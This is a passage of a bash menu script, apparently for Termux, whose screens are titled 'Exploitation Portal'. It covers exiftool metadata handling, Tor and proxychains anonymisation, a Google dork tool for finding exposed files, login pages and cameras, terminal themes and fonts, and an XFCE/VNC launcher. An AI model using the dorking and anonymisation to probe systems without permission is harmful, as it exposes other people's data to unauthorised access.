                    printf "  ${WH}Batch strip folder:   exiftool -all= -r /path/to/folder/${RESET}\n"
                    printf "  ${WH}Save to TXT:          exiftool photo.jpg > output.txt${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  ${WH}Read metadata${RESET}  ·  ${C21}${BOLD}[S]${RESET}  ${WH}Strip metadata${RESET}  ·  ${C21}${BOLD}[I]${RESET}  ${WH}Install${RESET}  ·  ${FADE}[b] Back  [m] Menu${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r ex_ch
                    case "${ex_ch^^}" in
                        R)
                            echo ""
                            printf "  ${WH}File path: ${RESET}"; read -r ex_file
                            ex_file=$(_xpath "$ex_file")
                            [[ ! -f "$ex_file" ]] && { printf "  ${RED}File not found${RESET}\n"; sleep 1; continue; }
                            local ex_out="$HACKDIR/exif_$(basename "$ex_file")_$(date +%Y%m%d_%H%M).txt"
                            echo ""
                            _dv21
                            exiftool "$ex_file" 2>/dev/null | tee "$ex_out"
                            echo ""
                            printf "  ${GRN}✓ Saved to %s${RESET}\n" "$ex_out"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        S)
                            echo ""
                            printf "  ${WH}File or folder path: ${RESET}"; read -r ex_strip
                            ex_strip=$(_xpath "$ex_strip")
                            printf "  ${WH}Strip GPS only? [y = GPS only / n = all metadata]: ${RESET}"; read -r ex_gps
                            echo ""
                            _dv21
                            if [[ "$ex_gps" == "y" || "$ex_gps" == "Y" ]]; then
                                exiftool -GPS:all= -r "$ex_strip" 2>/dev/null
                            else
                                exiftool -all= -r "$ex_strip" 2>/dev/null
                            fi
                            echo ""
                            printf "  ${GRN}✓ Metadata stripped from %s${RESET}\n" "$ex_strip"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I)
                            echo ""
                            printf "  ${C21}[*] Installing exiftool...${RESET}\n\n"
                            pkg install exiftool -y 2>/dev/null || pkg install perl -y && cpan install Image::ExifTool 2>/dev/null
                            echo ""
                            command -v exiftool &>/dev/null && printf "  ${GRN}✓ exiftool installed${RESET}\n" || printf "  ${YEL}Try: pkg install exiftool${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [P] PROXYCHAINS + TOR ─────────────────────────────────────
            P)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [P] PROXYCHAINS + TOR  ·  GHOST MODE${RESET}\n"
                    _dv21
                    echo ""
                    local tor_running=0
                    local pc_installed=0
                    pgrep -x tor &>/dev/null 2>/dev/null && tor_running=1
                    (command -v proxychains4 &>/dev/null || command -v proxychains &>/dev/null) && pc_installed=1
                    if [[ $tor_running -eq 1 ]]; then
                        printf "  ${GRN}${BOLD}● TOR        RUNNING  ·  traffic routing through Tor network${RESET}\n"
                    else
                        printf "  ${RED}${BOLD}○ TOR        STOPPED  ·  run [T] to start${RESET}\n"
                    fi
                    if [[ $pc_installed -eq 1 ]]; then
                        printf "  ${GRN}${BOLD}● PROXYCHAINS INSTALLED${RESET}\n"
                    else
                        printf "  ${RED}${BOLD}○ PROXYCHAINS NOT FOUND  ·  run [I] to install${RESET}\n"
                    fi
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}[I]${RESET}  ${WH}Install Tor + ProxyChains${RESET}\n"
                    printf "  ${C21}${BOLD}[T]${RESET}  ${WH}Start Tor${RESET}\n"
                    printf "  ${C21}${BOLD}[K]${RESET}  ${WH}Stop Tor${RESET}\n"
                    printf "  ${C21}${BOLD}[C]${RESET}  ${WH}Check Tor IP (verify you're anonymous)${RESET}\n"
                    printf "  ${C21}${BOLD}[X]${RESET}  ${WH}Test ProxyChains connection${RESET}\n"
                    printf "  ${C21}${BOLD}[R]${RESET}  ${WH}Reload proxy detection (update session status)${RESET}\n"
                    echo ""
                    printf "  ${FADE}Once Tor is running, restart Fezzy Station to activate ghost mode.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r pr_ch
                    case "${pr_ch^^}" in
                        I)
                            echo ""
                            printf "  ${C21}[*] Installing Tor + ProxyChains...${RESET}\n\n"
                            pkg install tor torsocks -y 2>/dev/null
                            pkg install proxychains-ng -y 2>/dev/null || pkg install proxychains -y 2>/dev/null
                            echo ""
                            # Configure proxychains to use Tor socks5
                            local pc_conf="$PREFIX/etc/proxychains.conf"
                            if [[ -f "$pc_conf" ]]; then
                                sed -i 's/^socks4.*/socks5 127.0.0.1 9050/' "$pc_conf" 2>/dev/null
                                printf "  ${GRN}✓ proxychains.conf configured for Tor (socks5 127.0.0.1:9050)${RESET}\n"
                            fi
                            command -v tor &>/dev/null && printf "  ${GRN}✓ Tor installed${RESET}\n" || printf "  ${YEL}Tor install may have failed — check pkg install tor${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        T)
                            echo ""
                            printf "  ${C21}[*] Starting Tor...${RESET}\n"
                            tor &>/dev/null &
                            sleep 3
                            pgrep -x tor &>/dev/null && printf "  ${GRN}✓ Tor is running — restart Fezzy Station to activate ghost mode${RESET}\n" || printf "  ${YEL}Tor may still be bootstrapping — wait 10s and check [C]${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        K)
                            echo ""
                            pkill tor 2>/dev/null
                            printf "  ${GRN}✓ Tor stopped${RESET}\n"
                            FEZZY_PROXY_ACTIVE=0; FEZZY_PROXY_CMD=""
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        C)
                            echo ""
                            printf "  ${C21}[*] Checking your current IP via Tor...${RESET}\n\n"
                            local tor_ip
                            if command -v torsocks &>/dev/null; then
                                tor_ip=$(torsocks curl -s --max-time 10 https://check.torproject.org/api/ip 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print('IP:', d.get('IP','?'), '| Tor:', d.get('IsTor','?'))" 2>/dev/null)
                                printf "  ${WH}%s${RESET}\n" "${tor_ip:-Could not reach check.torproject.org}"
                            else
                                printf "  ${YEL}torsocks not installed — run [I] first${RESET}\n"
                            fi
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        X)
                            echo ""
                            printf "  ${C21}[*] Testing ProxyChains connection...${RESET}\n\n"
                            if command -v proxychains4 &>/dev/null; then
                                proxychains4 -q curl -s --max-time 10 https://check.torproject.org/api/ip 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print('IP:', d.get('IP','?'), '| Tor:', d.get('IsTor','?'))" 2>/dev/null || printf "  ${YEL}Connection failed — is Tor running?${RESET}\n"
                            elif command -v proxychains &>/dev/null; then
                                proxychains -q curl -s --max-time 10 https://check.torproject.org/api/ip 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print('IP:', d.get('IP','?'), '| Tor:', d.get('IsTor','?'))" 2>/dev/null || printf "  ${YEL}Connection failed — is Tor running?${RESET}\n"
                            else
                                printf "  ${YEL}ProxyChains not installed — run [I] first${RESET}\n"
                            fi
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        R)
                            _proxy_setup
                            printf "  ${GRN}✓ Proxy status refreshed${RESET}\n"
                            [[ $FEZZY_PROXY_ACTIVE -eq 1 ]] && printf "  ${GRN}● Ghost mode ACTIVE${RESET}\n" || printf "  ${FADE}○ Ghost mode inactive${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [13] GDORKER ─────────────────────────────────────────────
            13)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [13] GDORKER  ·  GOOGLE DORK ENGINE${RESET}\n"
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}GDorker builds and fires advanced Google search operators (dorks).${RESET}\n"
                    printf "  ${WH}Find exposed files, login pages, cameras, sensitive directories.${RESET}\n"
                    printf "  ${WH}Build dorks interactively or run from a text file in ~/Gdorker.${RESET}\n"
                    printf "  ${WH}Pre-built dork categories: files · logins · dirs · cameras · 999.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}GDORKER LOCATION:${RESET}  ${WH}~/Gdorker${RESET}\n"
                    printf "  ${C21}${BOLD}SCAN INPUT FOLDER:${RESET}  ${WH}~/Gdorker/scan_inputs/${RESET}  ${FADE}— drop .txt dork files here${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}HOW TO USE${RESET}\n"
                    printf "  ${WH}Basic run:         cd ~/Gdorker && python3 gdorker.py -d 'site:target.com filetype:pdf'${RESET}\n"
                    printf "  ${WH}From file:         python3 gdorker.py -f dorks.txt${RESET}\n"
                    printf "  ${WH}Help:              python3 gdorker.py --help${RESET}\n"
                    printf "  ${WH}Save results:      python3 gdorker.py -d 'inurl:admin' -o results.txt${RESET}\n"
                    echo ""
                    printf "  ${C21}SOI NOTE: Google dorks are passive OSINT — no direct target contact.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}[R]${RESET}  ${WH}Run GDorker${RESET}  ·  ${C21}${BOLD}[F]${RESET}  ${WH}Run from scan_inputs folder${RESET}  ·  ${C21}${BOLD}[L]${RESET}  ${WH}List scan files${RESET}\n"
                    printf "  ${C21}${BOLD}[I]${RESET}  ${WH}Install / setup GDorker${RESET}  ·  ${FADE}[b] Back  [m] Menu${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r gd_ch
                    local GDORKER_DIR="$HOME/Gdorker"
                    local GDORKER_SCAN="$GDORKER_DIR/scan_inputs"
                    mkdir -p "$GDORKER_SCAN" 2>/dev/null
                    case "${gd_ch^^}" in
                        R)
                            echo ""
                            printf "  ${WH}Dork query (e.g. site:example.com filetype:pdf): ${RESET}"; read -r gd_dork
                            [[ -z "$gd_dork" ]] && { printf "  ${RED}Empty dork — cancelled${RESET}\n"; sleep 1; continue; }
                            printf "  ${WH}Output file name (ENTER to skip save): ${RESET}"; read -r gd_out
                            echo ""
                            _dv21
                            if [[ -d "$GDORKER_DIR" ]]; then
                                cd "$GDORKER_DIR"
                                if [[ -n "$gd_out" ]]; then
                                    python3 gdorker.py -d "$gd_dork" -o "$HACKDIR/${gd_out%.txt}.txt" 2>/dev/null | tee "$HACKDIR/gdorker_$(date +%Y%m%d_%H%M).txt"
                                else
                                    python3 gdorker.py -d "$gd_dork" 2>/dev/null | tee "$HACKDIR/gdorker_$(date +%Y%m%d_%H%M).txt"
                                fi
                                cd ~
                                echo ""; printf "  ${GRN}✓ Results saved to \$HACKDIR${RESET}\n"
                            else
                                printf "  ${RED}GDorker not found at ~/Gdorker — run [I] to install${RESET}\n"
                            fi
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        F)
                            echo ""
                            local scan_files=()
                            mapfile -t scan_files < <(find "$GDORKER_SCAN" -name "*.txt" -type f 2>/dev/null)
                            if [[ ${#scan_files[@]} -eq 0 ]]; then
                                printf "  ${YEL}No .txt files found in %s${RESET}\n" "$GDORKER_SCAN"
                                printf "  ${FADE}Drop dork list files (.txt) into ~/Gdorker/scan_inputs/ and run [F] again.${RESET}\n"
                                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                            fi
                            printf "  ${C21}Files in scan_inputs:${RESET}\n\n"
                            local fi=1
                            for sf in "${scan_files[@]}"; do
                                local lc; lc=$(wc -l < "$sf" 2>/dev/null || echo "?")
                                printf "  ${C21}%2d.${RESET}  %-40s  ${FADE}%s lines${RESET}\n" "$fi" "$(basename "$sf")" "$lc"
                                ((fi++))
                            done
                            echo ""
                            printf "  ${WH}Pick number: ${RESET}"; read -r fn
                            local fidx=$(( fn - 1 ))
                            local picked_file="${scan_files[$fidx]}"
                            if [[ -z "$picked_file" || ! -f "$picked_file" ]]; then
                                printf "  ${RED}Invalid selection${RESET}\n"; sleep 1; continue
                            fi
                            echo ""
                            _dv21
                            if [[ -d "$GDORKER_DIR" ]]; then
                                cd "$GDORKER_DIR"
                                python3 gdorker.py -f "$picked_file" 2>/dev/null | tee "$HACKDIR/gdorker_$(basename "$picked_file" .txt)_$(date +%Y%m%d_%H%M).txt"
                                cd ~
                                echo ""; printf "  ${GRN}✓ Results saved to \$HACKDIR${RESET}\n"
                            else
                                printf "  ${RED}GDorker not found — run [I]${RESET}\n"
                            fi
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        L)
                            echo ""
                            printf "  ${C21}[SCAN INPUTS]${RESET}  ${WH}%s${RESET}\n\n" "$GDORKER_SCAN"
                            local sc_cnt; sc_cnt=$(find "$GDORKER_SCAN" -name "*.txt" 2>/dev/null | wc -l)
                            if [[ "$sc_cnt" -eq 0 ]]; then
                                printf "  ${FADE}Empty — drop .txt dork files here${RESET}\n"
                            else
                                find "$GDORKER_SCAN" -name "*.txt" -type f | while read -r sf; do
                                    local lc; lc=$(wc -l < "$sf" 2>/dev/null || echo "?")
                                    printf "  ${C21}●${RESET}  %-45s  ${FADE}%s lines${RESET}\n" "$(basename "$sf")" "$lc"
                                done
                                echo ""
                                printf "  ${GRN}%s file(s) ready${RESET}\n" "$sc_cnt"
                            fi
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I)
                            echo ""
                            printf "  ${C21}[*] Setting up GDorker...${RESET}\n\n"
                            if [[ ! -d "$GDORKER_DIR" ]]; then
                                printf "  ${YEL}Cloning GDorker...${RESET}\n"
                                git clone https://github.com/mr0erek/Gdorker "$GDORKER_DIR" 2>/dev/null \
                                    && printf "  ${GRN}✓ Cloned to ~/Gdorker${RESET}\n" \
                                    || printf "  ${RED}Clone failed — check internet / git${RESET}\n"
                            else
                                printf "  ${GRN}✓ ~/Gdorker already exists${RESET}\n"
                            fi
                            if [[ -f "$GDORKER_DIR/requirements.txt" ]]; then
                                pip install -r "$GDORKER_DIR/requirements.txt" --break-system-packages 2>/dev/null \
                                    && printf "  ${GRN}✓ Requirements installed${RESET}\n" \
                                    || printf "  ${YEL}Some requirements may have failed — check manually${RESET}\n"
                            fi
                            mkdir -p "$GDORKER_SCAN"
                            printf "  ${GRN}✓ scan_inputs folder ready: %s${RESET}\n" "$GDORKER_SCAN"
                            printf "  ${FADE}Drop .txt dork files into scan_inputs/ and use [F] to run them.${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [14] TERMUX11 ─────────────────────────────────────────────
            14)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [14] TERMUX11  ·  TERMINAL UI SWITCHER${RESET}\n"
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}SYNOPSIS${RESET}\n"
                    printf "  ${WH}Termux11 (Termux:Styling) changes your terminal font and colour scheme.${RESET}\n"
                    printf "  ${WH}Pick from built-in themes: Dracula, Monokai, Solarized, Nord and more.${RESET}\n"
                    printf "  ${WH}Swap fonts: Cascadia Code, Fira Code, Source Code Pro, JetBrains Mono.${RESET}\n"
                    printf "  ${WH}Applies live — no restart needed. Write custom theme to colors.properties.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}COLOUR THEMES${RESET}\n"
                    printf "  ${WH}[1]  Dracula         ${FADE}— purple/pink neon · closest to Fezzy Station vibes${RESET}\n"
                    printf "  ${WH}[2]  Monokai         ${FADE}— warm dark · green/yellow accents${RESET}\n"
                    printf "  ${WH}[3]  Solarized Dark  ${FADE}— classic dark · easy on eyes${RESET}\n"
                    printf "  ${WH}[4]  Nord            ${FADE}— cool blue tones · clean and minimal${RESET}\n"
                    printf "  ${WH}[5]  Gruvbox Dark    ${FADE}— warm retro · brown/gold${RESET}\n"
                    printf "  ${WH}[6]  One Dark        ${FADE}— Atom editor style · blue-grey${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}FONTS${RESET}\n"
                    printf "  ${WH}[F1] Cascadia Code  ${FADE}— Microsoft monospace · ligatures${RESET}\n"
                    printf "  ${WH}[F2] Fira Code      ${FADE}— Mozilla open source · programming ligatures${RESET}\n"
                    printf "  ${WH}[F3] JetBrains Mono ${FADE}— JetBrains · wide characters · readable${RESET}\n"
                    echo ""
                    printf "  ${C21}${BOLD}INSTALL${RESET}\n"
                    printf "  ${WH}[I]  Install Termux:Styling (F-Droid app — do from Android, not here)${RESET}\n"
                    printf "  ${WH}[M]  Manual theme write — paste a colors.properties block directly${RESET}\n"
                    printf "  ${WH}[V]  View current colors.properties file${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r t11_ch
                    local COLORS_FILE="$HOME/.termux/colors.properties"
                    local FONT_FILE="$HOME/.termux/font.ttf"
                    mkdir -p "$HOME/.termux" 2>/dev/null
                    case "${t11_ch^^}" in
                        1)  # Dracula
                            cat > "$COLORS_FILE" << 'THEMEEOF'
background=#282a36
foreground=#f8f8f2
cursor=#f8f8f2
color0=#21222c
color1=#ff5555
color2=#50fa7b
color3=#f1fa8c
color4=#bd93f9
color5=#ff79c6
color6=#8be9fd
color7=#f8f8f2
color8=#6272a4
color9=#ff6e6e
color10=#69ff94
color11=#ffffa5
color12=#d6acff
color13=#ff92df
color14=#a4ffff
color15=#ffffff
THEMEEOF
                            printf "  ${GRN}✓ Dracula theme applied — run: termux-reload-settings${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        2)  # Monokai
                            cat > "$COLORS_FILE" << 'THEMEEOF'
background=#272822
foreground=#f8f8f2
cursor=#f8f8f0
color0=#272822
color1=#f92672
color2=#a6e22e
color3=#f4bf75
color4=#66d9ef
color5=#ae81ff
color6=#a1efe4
color7=#f8f8f2
color8=#75715e
color9=#f92672
color10=#a6e22e
color11=#f4bf75
color12=#66d9ef
color13=#ae81ff
color14=#a1efe4
color15=#f9f8f5
THEMEEOF
                            printf "  ${GRN}✓ Monokai theme applied — run: termux-reload-settings${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        3)  # Solarized Dark
                            cat > "$COLORS_FILE" << 'THEMEEOF'
background=#002b36
foreground=#839496
cursor=#839496
color0=#073642
color1=#dc322f
color2=#859900
color3=#b58900
color4=#268bd2
color5=#d33682
color6=#2aa198
color7=#eee8d5
color8=#002b36
color9=#cb4b16
color10=#586e75
color11=#657b83
color12=#839496
color13=#6c71c4
color14=#93a1a1
color15=#fdf6e3
THEMEEOF
                            printf "  ${GRN}✓ Solarized Dark applied — run: termux-reload-settings${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        4)  # Nord
                            cat > "$COLORS_FILE" << 'THEMEEOF'
background=#2e3440
foreground=#d8dee9
cursor=#d8dee9
color0=#3b4252
color1=#bf616a
color2=#a3be8c
color3=#ebcb8b
color4=#81a1c1
color5=#b48ead
color6=#88c0d0
color7=#e5e9f0
color8=#4c566a
color9=#bf616a
color10=#a3be8c
color11=#ebcb8b
color12=#81a1c1
color13=#b48ead
color14=#8fbcbb
color15=#eceff4
THEMEEOF
                            printf "  ${GRN}✓ Nord theme applied — run: termux-reload-settings${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        5)  # Gruvbox
                            cat > "$COLORS_FILE" << 'THEMEEOF'
background=#282828
foreground=#ebdbb2
cursor=#ebdbb2
color0=#282828
color1=#cc241d
color2=#98971a
color3=#d79921
color4=#458588
color5=#b16286
color6=#689d6a
color7=#a89984
color8=#928374
color9=#fb4934
color10=#b8bb26
color11=#fabd2f
color12=#83a598
color13=#d3869b
color14=#8ec07c
color15=#ebdbb2
THEMEEOF
                            printf "  ${GRN}✓ Gruvbox Dark applied — run: termux-reload-settings${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        6)  # One Dark
                            cat > "$COLORS_FILE" << 'THEMEEOF'
background=#282c34
foreground=#abb2bf
cursor=#528bff
color0=#282c34
color1=#e06c75
color2=#98c379
color3=#e5c07b
color4=#61afef
color5=#c678dd
color6=#56b6c2
color7=#abb2bf
color8=#5c6370
color9=#e06c75
color10=#98c379
color11=#e5c07b
color12=#61afef
color13=#c678dd
color14=#56b6c2
color15=#ffffff
THEMEEOF
                            printf "  ${GRN}✓ One Dark applied — run: termux-reload-settings${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        F1)
                            echo ""
                            printf "  ${C21}[*] Downloading Cascadia Code font...${RESET}\n"
                            curl -sL "https://github.com/microsoft/cascadia-code/releases/latest/download/CascadiaCode.ttf" \
                                -o "$FONT_FILE" 2>/dev/null \
                                && printf "  ${GRN}✓ Font installed — run: termux-reload-settings${RESET}\n" \
                                || printf "  ${YEL}Download failed — check internet connection${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        F2)
                            echo ""
                            printf "  ${C21}[*] Downloading Fira Code font...${RESET}\n"
                            curl -sL "https://github.com/tonsky/FiraCode/releases/latest/download/Fira_Code_v6.2.zip" \
                                -o /tmp/firacode.zip 2>/dev/null
                            unzip -p /tmp/firacode.zip "ttf/FiraCode-Regular.ttf" > "$FONT_FILE" 2>/dev/null \
                                && printf "  ${GRN}✓ Fira Code installed — run: termux-reload-settings${RESET}\n" \
                                || printf "  ${YEL}Install failed — try manually from F-Droid Termux:Styling${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        F3)
                            echo ""
                            printf "  ${C21}[*] Downloading JetBrains Mono font...${RESET}\n"
                            curl -sL "https://github.com/JetBrains/JetBrainsMono/releases/latest/download/JetBrainsMono-2.304.zip" \
                                -o /tmp/jbmono.zip 2>/dev/null
                            unzip -p /tmp/jbmono.zip "fonts/ttf/JetBrainsMono-Regular.ttf" > "$FONT_FILE" 2>/dev/null \
                                && printf "  ${GRN}✓ JetBrains Mono installed — run: termux-reload-settings${RESET}\n" \
                                || printf "  ${YEL}Install failed — try manually${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        I)
                            echo ""
                            printf "  ${WH}Termux:Styling is an F-Droid app — install from Android:${RESET}\n\n"
                            printf "  ${C21}  1.${RESET}  ${WH}Open F-Droid on your phone${RESET}\n"
                            printf "  ${C21}  2.${RESET}  ${WH}Search: Termux:Styling${RESET}\n"
                            printf "  ${C21}  3.${RESET}  ${WH}Install it${RESET}\n"
                            printf "  ${C21}  4.${RESET}  ${WH}Long-press the Termux screen → More → Style${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        M)
                            echo ""
                            printf "  ${WH}Paste your colors.properties content (finish with a line containing only END):${RESET}\n\n"
                            local custom_theme=""
                            while IFS= read -r line; do
                                [[ "$line" == "END" ]] && break
                                custom_theme+="$line\n"
                            done
                            if [[ -n "$custom_theme" ]]; then
                                printf "%b" "$custom_theme" > "$COLORS_FILE"
                                printf "  ${GRN}✓ Custom theme written — run: termux-reload-settings${RESET}\n"
                            else
                                printf "  ${FADE}Nothing written${RESET}\n"
                            fi
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        V)
                            echo ""
                            if [[ -f "$COLORS_FILE" ]]; then
                                _dv21
                                cat "$COLORS_FILE"
                                _dv21
                            else
                                printf "  ${FADE}No colors.properties found at %s${RESET}\n" "$COLORS_FILE"
                            fi
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        B) break ;;
                        M) media_station_portal; return ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;

            # ── [V] VNC / XFCE4 LAUNCH SHORTCUT ─────────────────────────
            V)
                while true; do
                    clear
                    echo ""
                    _dv21
                    printf "  ${C21}${BOLD}EXPLOITATION PORTAL  ·  [V] VNC + XFCE4 LAUNCH  ·  DESKTOP MODE${RESET}\n"
                    _dv21
                    echo ""
                    printf "  ${WH}Launch a full XFCE4 graphical desktop over Termux-X11.${RESET}\n"
                    printf "  ${WH}Fixed sequence: kill stale sessions → export DISPLAY → dbus-launch.${RESET}\n"
                    printf "  ${WH}Kill individual pids or nuke everything with one command.${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    # Live status check
                    local x11_pid; x11_pid=$(pgrep -f termux-x11 2>/dev/null | head -1)
                    local xfce_pid; xfce_pid=$(pgrep -f xfce4-session 2>/dev/null | head -1)
                    local vnc_pid; vnc_pid=$(pgrep -f Xvnc 2>/dev/null | head -1)
                    if [[ -n "$x11_pid" ]]; then
                        printf "  ${GRN}● Termux-X11   RUNNING  pid:%s${RESET}\n" "$x11_pid"
                    else
                        printf "  ${RED}○ Termux-X11   STOPPED${RESET}\n"
                    fi
                    if [[ -n "$xfce_pid" ]]; then
                        printf "  ${GRN}● XFCE4        RUNNING  pid:%s${RESET}\n" "$xfce_pid"
                    else
                        printf "  ${RED}○ XFCE4        STOPPED${RESET}\n"
                    fi
                    if [[ -n "$vnc_pid" ]]; then
                        printf "  ${GRN}● VNC Server   RUNNING  pid:%s${RESET}\n" "$vnc_pid"
                    else
                        printf "  ${FADE}○ VNC Server   not detected${RESET}\n"
                    fi
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}[1]${RESET}  ${WH}Launch XFCE4 desktop (Termux-X11 method)${RESET}\n"
                    printf "  ${C21}${BOLD}[2]${RESET}  ${WH}Launch with VNC server (vncserver :1)${RESET}\n"
                    printf "  ${C21}${BOLD}[3]${RESET}  ${WH}Kill XFCE4 session only${RESET}\n"
                    printf "  ${C21}${BOLD}[4]${RESET}  ${WH}Kill Termux-X11 only${RESET}\n"
                    printf "  ${C21}${BOLD}[5]${RESET}  ${WH}Kill VNC server only${RESET}\n"
                    printf "  ${C21}${BOLD}[K]${RESET}  ${RED}${BOLD}KILL ALL — nuke X11 + XFCE4 + VNC + dbus${RESET}\n"
                    printf "  ${C21}${BOLD}[6]${RESET}  ${WH}Reload .bashrc (source ~/.bashrc)${RESET}\n"
                    printf "  ${C21}${BOLD}[7]${RESET}  ${WH}Install Termux-X11 + XFCE4 packages${RESET}\n"
                    printf "  ${C21}${BOLD}[8]${RESET}  ${WH}Create ~/launch_xfce.sh shortcut script${RESET}\n"
                    printf "  ${C21}${BOLD}[9]${RESET}  ${WH}Refresh status (re-check running processes)${RESET}\n"
                    echo ""
                    _dv21
                    echo ""
                    printf "  ${C21}${BOLD}Choice » ${RESET}"
                    read -r vnc_ch
                    case "${vnc_ch^^}" in
                        1)
                            echo ""
                            printf "  ${C21}[*] Launching XFCE4 via Termux-X11...${RESET}\n\n"
                            printf "  ${FADE}Step 1: Kill any stale sessions...${RESET}\n"
                            pkill -f xfce4-session 2>/dev/null; pkill -f termux-x11 2>/dev/null
                            sleep 1
                            printf "  ${FADE}Step 2: Reload shell environment...${RESET}\n"
                            source ~/.bashrc 2>/dev/null
                            printf "  ${FADE}Step 3: Setting up display exports...${RESET}\n"
                            export DISPLAY=:0
                            export XDG_RUNTIME_DIR="${TMPDIR:-/data/data/com.termux/files/usr/tmp}"
                            printf "  ${FADE}Step 4: Starting Termux-X11...${RESET}\n"
                            if command -v termux-x11 &>/dev/null; then
                                termux-x11 :0 &
                                sleep 2
                                printf "  ${FADE}Step 5: Launching XFCE4 session via dbus...${RESET}\n"
                                dbus-launch --exit-with-session xfce4-session &
                                sleep 1
                                printf "  ${GRN}✓ XFCE4 launched — open Termux-X11 app on Android to view the desktop${RESET}\n"
                            else
                                printf "  ${RED}termux-x11 not found — run [7] to install${RESET}\n"
                            fi
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        2)
                            echo ""
                            printf "  ${C21}[*] Launching with VNC server...${RESET}\n\n"
                            pkill Xvnc 2>/dev/null; sleep 0.5
                            if command -v vncserver &>/dev/null; then
                                export DISPLAY=:1
                                vncserver :1 -geometry 1280x720 -depth 24 2>/dev/null
                                sleep 1
                                DISPLAY=:1 dbus-launch --exit-with-session xfce4-session &>/dev/null &
                                printf "  ${GRN}✓ VNC server started on :1 (port 5901)${RESET}\n"
                                printf "  ${WH}Connect VNC viewer to: localhost:5901${RESET}\n"
                                printf "  ${FADE}Or use a phone VNC app — bVNC, RealVNC, etc.${RESET}\n"
                            else
                                printf "  ${RED}vncserver not found — install: pkg install tigervnc${RESET}\n"
                                printf "  ${FADE}Also try: pkg install x11vnc${RESET}\n"
                            fi
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        3)
                            echo ""
                            pkill -f xfce4-session 2>/dev/null
                            pkill -f xfce4 2>/dev/null
                            printf "  ${GRN}✓ XFCE4 session killed${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        4)
                            echo ""
                            pkill -f termux-x11 2>/dev/null
                            printf "  ${GRN}✓ Termux-X11 killed${RESET}\n"
